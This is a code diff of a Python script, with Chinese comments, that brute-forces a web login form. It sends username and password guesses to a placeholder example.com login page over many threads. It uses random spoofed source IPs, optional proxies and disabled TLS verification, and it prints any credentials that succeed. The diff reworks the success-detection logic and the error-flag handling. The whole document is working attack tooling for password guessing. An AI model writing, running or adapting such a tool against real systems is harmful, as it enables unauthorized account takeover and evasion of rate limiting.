@@ -9,8 +9,8 @@ from Crypto.Cipher import DES, AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from concurrent import futures
 from lxml import etree
-from selenium.webdriver.chrome.options import Options 
-from selenium import webdriver
+#from selenium.webdriver.chrome.options import Options
+#from selenium import webdriver
 
 # 禁用https警告
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -141,7 +141,7 @@ COOKIES = {
 BROWSER = None
 #BROWSER = selenium_runtime()
 
-# 爆破函数，返回 (has_exception, found_password)
+# 爆破函数，返回 (no_exception, found_password)
 def run(username, password):
 
     IP = random_ipv4()
@@ -159,7 +159,8 @@ def run(username, password):
 
     try:
         # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
-        #response = session.get("https://example.com/login.html", headers=HEADERS, cookies=COOKIES, timeout=10, 
+        #response = session.get("https://example.com/login.html",
+        #    headers=HEADERS, cookies=COOKIES, timeout=10, 
         #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
         #html = etree.HTML(response.text, etree.HTMLParser())
         #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
@@ -172,32 +173,36 @@ def run(username, password):
             "username": username,
             "password": password
         }
-        response = session.post("https://example.com/login.html", data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
+        response = session.post("https://example.com/login.html",
+            data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
             allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
 
-        # if len(response.content) != 61:
-        # if response.status_code != 401:
-        # if "Failed" not in response.text:
-        # if response.status_code == 302 and "index/user.html" in response.headers['Location']:
+        # if len(response.content) == 100:
+        # if response.status_code == 401:
+        # if "Login failed" in response.text:
+        # if response.status_code == 302 and "index/login.html" in response.headers['Location']:
 
-        if len(response.content) != 61:
-            print(f"[+] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}")
-            return False, True
+        if "Login failed" in response.text:
+            return True, False
+        
+        if "Unknown user" in response.text:
+            return True, False
 
-        return False, False
+        print(f"[+] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}")
+        return True, True
 
     except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
-        return True, False
+        return False, False
     
     except MaxRetryError as e: # 大概率是 selenium 引起的异常
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} Selenium has crashed or has been manually closed")
-        return True, False
+        return False, False
 
     except Exception as e:
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
         print(traceback.format_exc())
-        return True, False
+        return False, False
 
 #
 # =================== [ 启动多线程爆破 ] ===================
@@ -228,7 +233,7 @@ def callback(future):
     global THREAD_POOL_STOP_SIGNAL, FINISHED_COUNT, EXCEPTION_COUNT
     
     # 获取结果
-    has_exception, found_password = future.result()
+    no_exception, found_password = future.result()
     
     # 完成计数+1
     with FINISHED_COUNT_LOCK:
@@ -236,7 +241,7 @@ def callback(future):
     
     # 检查异常
     with EXCEPTION_COUNT_LOCK:
-        if has_exception:
+        if no_exception == False:
             EXCEPTION_COUNT += 1
             if EXCEPTION_COUNT > 10:
                 print(f"[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
